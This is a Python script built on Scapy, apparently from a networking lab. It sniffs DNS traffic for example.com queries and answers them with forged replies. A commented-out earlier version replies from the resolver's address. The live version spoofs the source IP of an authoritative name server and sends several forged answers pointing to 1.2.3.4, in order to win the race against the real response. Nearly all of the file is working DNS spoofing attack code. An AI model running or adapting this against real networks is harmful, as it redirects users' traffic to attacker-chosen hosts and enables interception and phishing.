# from scapy.all import DNS, IP, UDP, Raw, DNSQR, DNSRR, sniff, send, sendp, get_if_list, Ether
# import sys

# PORT = 53

# def find_bridge_interfaces():
#     """
#     Find all network interfaces that start with 'br-' prefix.
    
#     Returns:
#         list: List of interface names starting with 'br-'
#     """
#     try:
#         # Get all interfaces
#         interfaces = get_if_list()
        
#         # Filter for br- prefix
#         bridge_interfaces = [iface for iface in interfaces if iface.startswith('br-')]
        
#         if not bridge_interfaces:
#             print("No bridge interfaces (br-*) found")
#         else:
#             print("Found bridge interfaces:")
#             for iface in bridge_interfaces:
#                 print(f"- {iface}")
                
#         return bridge_interfaces
        
#     except Exception as e:
#         print(f"Error finding network interfaces: {e}")
#         return []

# def craft_dns_response(original_packet, dns_packet):
#     # Create Ethernet layer with correct MAC addresses
#     ether = Ether(
#         src=original_packet[Ether].dst,
#         dst=original_packet[Ether].src
#     )
    
#     # Create IP layer
#     ip = IP(
#         src=original_packet[IP].dst,
#         dst=original_packet[IP].src,
#         len=None,  # Let Scapy calculate length
#         id=original_packet[IP].id
#     )
    
#     # Create UDP layer
#     udp = UDP(
#         sport=original_packet[UDP].dport,
#         dport=original_packet[UDP].sport,
#         len=None  # Let Scapy calculate length
#     )
    
#     # Create DNS response
#     dns_response = DNS(
#         id=dns_packet.id,
#         qr=1,  # This is a response
#         aa=1,  # Authoritative Answer
#         rd=dns_packet.rd,
#         ra=1,  # Recursion Available
#         qdcount=1,
#         ancount=1,
#         qd=dns_packet.qd,
#         an=DNSRR(
#             rrname=dns_packet[DNSQR].qname,
#             type='A',
#             ttl=123,
#             rdata='1.2.3.4'
#         )
#     )
    
#     # Stack all layers and send response
#     response = ether/ip/udp/dns_response
#     print(response, "CRAFTED RESPONSE<<<<<<,")
#     sendp(response, verbose=0, iface=original_packet.sniffed_on)


# def dns_packet_handler(packet):
#     if packet[IP].src == "10.5.0.5" or packet[IP].dst == "10.5.0.5":
#         # print(packet, type(packet), "RAW\n")
#     # Check if packet has IP, UDP and Raw layers
#     # if packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(Raw):

#         # Only process packets going to DNS port
#         # if packet[UDP].dport == PORT or packet[UDP].sport == PORT:
#         try:
#             # Convert Raw layer to DNS
#             # dns_packet = DNS(packet[Raw].load)
            
#             # Process DNS Query
#             if packet.qr == 0:  # DNS Query
#                 query_name = packet[DNSQR].qname.decode('utf-8').rstrip('.')
#                 if query_name == "example.com":
#                     print("\n=== DNS Query Detected ===")
#                     print(f"Source MAC: {packet[Ether].src}")
#                     print(f"Destination MAC: {packet[Ether].dst}")
#                     print(f"Source IP: {packet[IP].src}")
#                     print(f"Destination IP: {packet[IP].dst}")
#                     print(f"Source Port: {packet[UDP].sport}")
#                     print(f"Destination Port: {packet[UDP].dport}")
#                     print(f"Query Name: {query_name}")
#                     print(f"Query Type: {packet[DNSQR].qtype}")

#                     craft_dns_response(packet, packet)
#                     print("Responded with IP: 1.2.3.4")
            
#             # Process DNS Response
#             elif packet.qr == 1:  # DNS Response
#                 # print(packet, " RESPONSE<<<<<<,")
                
#                 if packet.ancount > 0:  # If there are answers
#                     for i in range(packet.ancount):
#                         rdata = packet[DNSRR][i].rdata
#                         if isinstance(rdata, bytes):
#                             rdata = rdata.decode()
#                         if rdata == "example.com":
#                             print("\n=== DNS Response Detected ===")
#                             print(f"Source MAC: {packet[Ether].src}")
#                             print(f"Destination MAC: {packet[Ether].dst}")
#                             print(f"Source IP: {packet[IP].src}")
#                             print(f"Destination IP: {packet[IP].dst}")
#                             print(f"Source Port: {packet[UDP].sport}")
#                             print(f"Destination Port: {packet[UDP].dport}")
#                             print(f"Response Data: {rdata}")

#             print("=====================\n")
            
#         except Exception as e:
#             print(f"Error parsing DNS packet: {e}")

# def start_sniffer():
#     try:
#         print("Starting DNS packet sniffer...")
#         print("Filtering for ivpndns.com queries...")
#         print("Press Ctrl+C to stop\n")
        
#         # Start sniffing
#         # ,  iface="lo"
#         # filter=f"udp port {PORT}"

#         sniff(filter="udp", iface=find_bridge_interfaces(), prn=dns_packet_handler, store=0)
    
#     except KeyboardInterrupt:
#         print("\nSniffer stopped by user")
#         sys.exit(0)
#     except Exception as e:
#         print(f"\nAn error occurred: {e}")
#         sys.exit(1)

# if __name__ == "__main__":
#     start_sniffer()
from scapy.all import DNS, IP, UDP, Raw, DNSQR, DNSRR, sniff, send, Ether, sendp
import sys
from threading import Thread

def send_spoofed_response(original_packet, dns_packet, count=3):
    """Send DNS response spoofing authoritative server"""
    
    # Get the real authoritative server IP for example.com (93.184.216.34)
    auth_server_ip = "199.43.133.53" # 199.43.135.53
    
    # Create response packet
    ether = Ether(
        src=original_packet[Ether].dst,
        dst=original_packet[Ether].src
    )
    
    ip = IP(
        src=auth_server_ip,  # Spoof source as auth server
        dst=original_packet[IP].src,
        len=None,
        id=original_packet[IP].id
    )
    
    udp = UDP(
        sport=53,  # DNS server port
        dport=original_packet[UDP].sport,
        len=None
    )
    
    dns_response = DNS(
        id=dns_packet.id,
        qr=1,  # Response
        aa=1,  # Authoritative Answer
        rd=dns_packet.rd,
        ra=1,
        qdcount=1,
        ancount=1,
        qd=dns_packet.qd,
        an=DNSRR(
            rrname=dns_packet[DNSQR].qname,
            type='A',
            ttl=300,
            rdata='1.2.3.4'
        )
    )
    
    response = ether/ip/udp/dns_response
    
    # Send multiple responses quickly
    for _ in range(count):
        sendp(response, verbose=0, iface=original_packet.sniffed_on)

def dns_packet_handler(packet):
    if all(packet.haslayer(layer) for layer in [Ether, IP, UDP, Raw]):
        try:
            dns_packet = DNS(packet[Raw].load)
            
            # Check if it's a query for example.com
            if (dns_packet.qr == 0 and  # It's a query
                dns_packet[DNSQR].qname.decode('utf-8').rstrip('.') == "example.com"):
                
                print("\n=== example.com Query Detected ===")
                print(f"Source IP: {packet[IP].src}")
                print(f"Query ID: {dns_packet.id}")
                
                # Start a thread to send spoofed responses
                Thread(
                    target=send_spoofed_response,
                    args=(packet, dns_packet),
                    daemon=True
                ).start()
                
                print("Sending spoofed responses from auth server")
                print("=====================\n")
                
        except Exception as e:
            print(f"Error processing packet: {e}")

def start_sniffer(port=53):
    try:
        print("Starting DNS spoofing interceptor...")
        print("Targeting: example.com")
        print("Press Ctrl+C to stop\n")
        
        # Start sniffing
        sniff(
            filter=f"udp port {port}",
            prn=dns_packet_handler,
            store=0,
            iface="lo"
        )
    
    except KeyboardInterrupt:
        print("\nInterceptor stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    start_sniffer()